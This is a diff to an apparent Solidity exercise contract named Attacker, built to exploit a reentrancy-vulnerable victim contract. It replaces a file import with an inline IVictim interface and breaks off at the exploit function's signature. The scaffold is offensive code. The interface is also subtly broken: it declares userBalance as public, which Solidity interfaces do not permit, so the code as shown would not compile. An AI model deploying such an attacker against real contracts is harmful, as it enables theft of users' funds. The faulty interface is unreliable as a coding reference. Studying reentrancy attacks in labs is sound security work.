@@ -1,14 +1,18 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-import "reentrancy-victim.sol";
+interface IVictim {
+	function deposit() external payable;
+	function withdraw() external;
+	function userBalance (address user) public view returns (uint256);
+}
 
 contract Attacker {
 	
-	Reentrancy public target;	
+	IVictim public target;	
 	
 	constructor(address _target) {
-		target = Reentrancy(_target);
+		target = IVictim(_target);
 	}
 	
 	function exploit() external payable {
